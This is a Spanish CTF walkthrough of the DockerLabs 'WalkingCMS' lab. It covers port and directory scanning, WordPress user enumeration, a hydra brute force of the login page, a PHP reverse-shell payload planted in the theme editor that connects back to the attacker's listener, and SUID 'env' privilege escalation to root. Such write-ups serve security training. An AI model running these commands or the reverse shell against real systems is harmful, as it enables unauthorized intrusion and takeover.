# WalkingCMS - Writeup

## 📋 Información General

- **Plataforma**: DockerLabs
- **Dificultad**: Fácil
- **Categorías**: Wordpress | Web Exploitation | Privilege Escalation
- **Fecha**: 25/02/2026
- **Tiempo empleado**: ~40 minutos
- **Autor**: Samuel Rodríguez aka Testarious

## 🔍 Reconocimiento y Enumeración

### Escaneo de Puertos

Empezamos realizando un escaneo de puertos para identificar los servicios disponibles:

```bash
# Escaneo completo de puertos
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2

# Escaneo detallado de puertos abiertos
nmap -sCV -p80 172.17.0.2
```

**Resultados:**
![Nmap](./content/screenshots/WalkingCMS/nmap.png)

Como podemos ver, solo está expuesto el puerto 80. Al acceder mediante el navegador observamos la página por defecto de Apache2 Debian.

![Apache](./content/screenshots/WalkingCMS/apache.png)

### Enumeración de Directorios y Archivos

Así que realizamos un escaneo de directorios con `gobuster` y nos encontramos con `/wordpress`:

```bash
# Enumeración de directorios gobuster
gobuster dir -u 172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Gobuster](./content/screenshots/WalkingCMS/gobuster.png)

Al acceder a `/wordpress` vemos una página web de Wordpress. Y navegando por las diferentes páginas vemos un post y nos fijamos en el nombre del autor (posible user):

![Wordpress](./content/screenshots/WalkingCMS/post-wp.png)

También observamos las tecnologías utilizadas en la página junto a sus versiones con la extensión `Wappalyzer`:

![Wappalyzer](./content/screenshots/WalkingCMS/wappalyzer.png)

Y aquí nos fijamos en la versión de Wordpress (6.4.3). Por lo que hacemos búsqueda por Google para ver si encontramos alguna vulnerabilidad conocida. Y efectivamente, encontramos una vulnerabilidad en la versión 6.4.3 de Wordpress en la que podemos ver los usuarios registrados.

➡️ [Exploit para ver usuarios](https://sploitus.com/exploit?id=1337DAY-ID-39351)

![Vulnerabilidad](./content/screenshots/WalkingCMS/exploit_users.png)

También podemor llegar al mismo resultado utilizando la herramienta `wpscan`:

```bash
wpscan --url http://172.17.0.2/wordpress --enumerate
```

![Wpscan](./content/screenshots/WalkingCMS/wpscan.png)

Confirmamos que el usuario `mario` que vimos anteriormente en un post de la web existe.

## 💻 Explotación

### Vector de Ataque 1: Fuerza Bruta

Como ya tenemos el usuario `mario`, podemos intentar una fuerza bruta para obtener la contraseña de la web de login de WordPress (http://172.17.0.2/wordpress/wp-login.php).

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:S=Location" -t 50   
```

![Hydra](./content/screenshots/WalkingCMS/password.png)

Este ataque nos devuelve la contraseña del usuario `mario`: `love`. Nos logueamos en la web de Wordpress con las credenciales obtenidas con éxito.

![Login](./content/screenshots/WalkingCMS/wordpress.png)

### Vector de Ataque 2: Establecimiento de Reverse Shell

Ahora desde el panel de administración de Wordpress, podemos editar el tema activo para establecer una conexión con una reverse shell, escuchando desde nuestra máquina y poniendo el siguiente código PHP (obtenido de revshells.com con algunas modificaciones para que funcione correctamente):

```bash
nc -nlvp 9999

$s=fsockopen("172.17.0.1",9999);$proc=proc_open("/bin/bash -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);
```

![Edit Theme](./content/screenshots/WalkingCMS/editphp.png)

![Reverse Shell](./content/screenshots/WalkingCMS/reverse_shell.png)

Y así ganamos acceso a la máquina como usuario `www-data`.

## 🔐 Escalada de Privilegios

### Enumeración Local

Utilizamos el comando `find` para buscar binarios con permisos SUID con el comando:

```bash
find / -perm -4000 2>/dev/null
```

Observamos que el binario `env` tiene permisos SUID. Por lo que podemos ejecutar el siguiente comando para ganar acceso root. Este comando y otros más para escalada de privilegios se pueden encontrar en [GTFOBins](https://gtfobins.github.io/).

```bash
env /bin/sh -p
```

![Find](./content/screenshots/WalkingCMS/root.png)

Finalmente, obtenemos acceso a la máquina como usuario root 🎉​


## 🛠️ Herramientas Utilizadas

| Herramienta | Versión | Uso específico |
|-------------|---------|----------------|
| nmap | 7.98 | Escaneo de puertos y servicios |
| wappalyzer | 6.10 | Identificación de tecnologías web |
| gobuster | 3.8.2 | Enumeración de directorios web |
| hydra | 9.6 | Fuerza bruta en login de Wordpress |
| wpscan | 3.8.28 | Escaneo de vulnerabilidades en Wordpress |

## 🔗 Recursos Adicionales

- [DockerLabs WhereIsMyWebShell](https://dockerlabs.es/)
- [Exploit para ver usuarios](https://sploitus.com/exploit?id=1337DAY-ID-39351)
- [Reverse Shell Generator](https://www.revshells.com/)
- [GTFOBins](https://gtfobins.github.io/)

## 🏆 Conclusión

Este CTF representa un excelente ejemplo práctico de pentesting en entornos web basados en WordPress. A lo largo de este ejercicio, hemos demostrado la importancia de un enfoque metodológico que combina:

- **Reconocimiento exhaustivo**: La identificación de tecnologías y versiones específicas (WordPress 6.4.3) fue crucial para descubrir vulnerabilidades conocidas.
- **Enumeración sistemática**: El uso combinado de herramientas como gobuster y wpscan nos permitió descubrir usuarios válidos y superficies de ataque.
- **Explotación controlada**: La fuerza bruta sobre credenciales débiles (`mario:love`) demostró cómo configuraciones inseguras pueden comprometer sistemas completos.
- **Persistencia y escalada**: La modificación de temas para establecer reverse shells y el aprovechamiento de permisos SUID en binarios como `env` ilustran vectores comunes de escalada de privilegios.

Este laboratorio refuerza conceptos fundamentales de seguridad web: la importancia de mantener actualizados los CMS, implementar políticas de contraseñas robustas, y restringir permisos innecesarios a nivel de sistema.

Seguimos! 🚀